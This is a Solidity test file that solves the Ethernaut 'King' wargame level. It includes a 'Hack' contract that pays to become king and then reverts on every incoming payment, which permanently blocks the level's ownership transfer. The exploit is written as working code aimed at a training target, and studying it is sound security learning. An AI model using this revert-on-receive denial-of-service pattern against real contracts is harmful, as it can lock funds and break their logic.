pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../King/KingHack.sol";
import "../King/King.sol";
import "../King/KingFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract KingTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
        King ethernautKing = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        emit log_address(ethernautKing._king());
        Hack hack = new Hack(ethernautKing);
        hack.attack{value: 1 ether}();
        emit log_address(ethernautKing._king());
        assertEq(address(hack), ethernautKing._king());

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Hack {
    King king;
    constructor(King _king) {
        king = _king;
    }
    function attack() public payable {
        address(king).call{value: msg.value}("");
    }

    receive() external payable {
        revert("You loose!!!");
    }
}